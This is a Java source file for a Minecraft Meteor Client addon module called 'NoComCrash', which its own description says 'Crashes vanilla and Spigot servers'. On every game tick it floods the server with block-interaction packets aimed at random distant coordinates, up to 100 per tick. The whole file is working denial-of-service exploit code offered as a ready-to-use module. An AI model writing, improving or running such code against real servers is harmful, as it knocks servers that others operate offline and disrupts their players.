package widecat.meteorcrashaddon.modules;

import widecat.meteorcrashaddon.CrashAddon;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import java.util.Objects;
import java.util.Random;

public class NoComCrash extends Module {
    private final Random r = new Random();

    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build()
    );

    public NoComCrash() {
        super(CrashAddon.CATEGORY, "NoCom-crash", "Crashes vanilla and Spigot servers");
    }

    private Vec3d pickRandomPos() {
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }
    
    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < amount.get(); i++) {
            Vec3d cpos = pickRandomPos();
            PlayerInteractBlockC2SPacket PACKET = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(PACKET);
        }
    }
}
